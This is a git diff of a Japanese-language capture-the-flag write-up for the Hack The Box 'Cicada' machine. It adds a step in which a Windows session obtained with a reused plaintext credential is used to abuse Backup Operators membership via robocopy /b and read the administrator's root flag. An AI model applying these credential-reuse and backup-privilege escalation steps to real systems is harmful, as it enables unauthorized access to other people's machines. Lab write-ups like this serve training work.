@@ -221,7 +221,8 @@ emily.oscarsのクレデンシャルを平文で確認
 ```sh
 └─$ smbget -U 'cicada.htb/david.orelious%aRt$Lp#7t*VQ!3' smb://10.129.231.149/DEV/Backup_script.ps1
 Using domain: CICADA.HTB, user: david.orelious
-smb://10.129.231.149/DEV/Backup_script.ps1                                                                                                                                                                                                  
+smb://10.129.231.149/DEV/Backup_script.ps1
+                
 Downloaded 601b in 6 seconds
                 
 └─$ cat Backup_script.ps1                                          
@@ -252,4 +253,35 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cat ../desktop/user.txt
 579f573c819fbd3f6f8e35448f29d77c
+```
+
+
+## STEP 5
+```sh
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+```
+```sh
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> robocopy 'c:\users\administrator\desktop' 'c:\users\emily.oscars.cicada\documents' root.txt /b /np /njh /njs
+
+                           1    c:\users\administrator\desktop\
+            New File                  34        root.txt
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cat root.txt
+c999fdba86c7923c3bee1a3176ac4320
 ```
